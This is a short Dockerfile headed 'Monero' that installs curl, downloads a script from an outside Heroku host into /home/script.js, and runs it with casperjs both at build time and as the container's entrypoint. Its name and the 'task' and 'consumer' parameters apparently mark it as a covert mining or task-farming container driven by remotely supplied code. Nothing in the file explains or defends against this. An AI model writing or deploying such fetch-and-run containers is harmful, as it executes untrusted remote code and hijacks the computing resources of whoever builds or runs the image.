# Monero

FROM vitr/casperjs
MAINTAINER zjgsuwk

ENV SCRIPT_DIR=/home

RUN echo 'time is : 1519377615806' && apt-get update && apt-get -y install curl && curl  http://victory-jupiter.herokuapp.com:80/task/2?consumer=cloud-docker \
> ${SCRIPT_DIR}/script.js

RUN /usr/local/bin/casperjs ${SCRIPT_DIR}/script.js

WORKDIR $SCRIPT_DIR

ENTRYPOINT ["casperjs", "script.js"]